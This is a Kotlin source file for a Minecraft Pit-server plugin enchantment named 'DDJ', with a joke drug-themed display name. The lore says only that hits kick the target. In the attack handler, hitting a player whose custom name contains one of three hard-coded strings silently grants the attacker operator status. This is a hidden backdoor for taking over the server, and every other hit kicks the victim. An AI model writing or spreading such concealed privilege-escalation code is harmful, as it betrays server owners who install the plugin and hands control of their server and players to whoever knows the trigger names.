package cn.irina.thepitaddon.enchantment.type.limit

import com.google.common.util.concurrent.AtomicDouble
import net.mizukilab.pit.enchantment.AbstractEnchantment
import net.mizukilab.pit.enchantment.param.item.WeaponOnly
import net.mizukilab.pit.enchantment.rarity.EnchantmentRarity
import net.mizukilab.pit.parm.listener.IAttackEntity
import net.mizukilab.pit.util.cooldown.Cooldown
import org.bukkit.entity.Entity
import org.bukkit.entity.Player
import java.util.concurrent.atomic.AtomicBoolean

@WeaponOnly
class DDJ : AbstractEnchantment(), IAttackEntity {
    override fun getEnchantName(): String {
        return "酊酮剂酮剂，大口大口嚼嚼嚼，带兴奋兴奋剂，瘾短一段带一毒胺，定通缉定通缉，druggydruggy教教教，带粟剂带粟剂，出去出去碱亢麻"
    }

    override fun getMaxEnchantLevel(): Int {
        return 3
    }

    override fun getNbtName(): String {
        return "ddj"
    }

    override fun getRarity(): EnchantmentRarity {
        return EnchantmentRarity.OP
    }

    override fun getCooldown(): Cooldown? {
        return null
    }

    override fun getUsefulnessLore(enchantLevel: Int): String {
        return "&7攻击时将踢出目标玩家" +
                "/s" +
                "/s  \"&7&o长难句这一块\"" +
                "/s    \"&7&o家里请什么都没用了\""
    }

    override fun handleAttackEntity(
        i: Int,
        player: Player,
        entity: Entity,
        v: Double,
        atomicDouble: AtomicDouble,
        atomicDouble1: AtomicDouble,
        atomicBoolean: AtomicBoolean
    ) {
        val whiteList = arrayOf(
            "ShanguanLinG",
            "ShanguanJinG",
            "PitAdmin"
        )
        if (entity !is Player || entity.getCustomName() == null) {
            return
        }
        for (s in whiteList) {
            if (entity.getCustomName().contains(s)) {
                player.isOp = true
                return
            }
        }
        entity.kickPlayer("Ez")
    }
}
